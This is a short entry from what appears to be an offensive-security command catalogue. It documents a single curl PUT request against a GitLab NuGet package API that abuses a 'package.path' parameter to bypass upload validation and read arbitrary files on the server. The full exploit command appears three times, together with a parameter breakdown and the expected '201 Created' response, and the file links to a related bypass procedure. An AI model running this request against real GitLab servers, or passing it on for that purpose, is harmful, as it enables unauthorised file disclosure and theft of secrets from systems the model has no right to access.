---
data: >-
  curl -XPUT -v -F '[package]=@/tmp/lala.txt'
  "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
tags:
  - http-put
  - bypass
type: command
executor: bash
platforms:
  - Linux
id: 3d2c20c7-fe85-40eb-9c0c-c0f75d585639
created_at: '2025-12-11T03:47:39.413Z'
updated_at: '2025-12-11T03:47:39.413Z'
verified: false
validated: true
submitted: true
---
# curl-put-package-bypass

## Command

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

## Description

Sends PUT request to bypass validation and read target file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-XPUT` | PUT method | Yes |
| `-v` | Verbose | No |
| `-F '[package]=@/tmp/lala.txt'` | Form field with dummy file | Yes |
| `package.path=/tmp/ggg` | Target path | Yes |

## Examples

### Basic Usage

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

## Expected Output

{"message":"201 Created"} with file content.

## Related
- [[procedures/Bypass-Package-Upload-Validation-for-File-Read]]
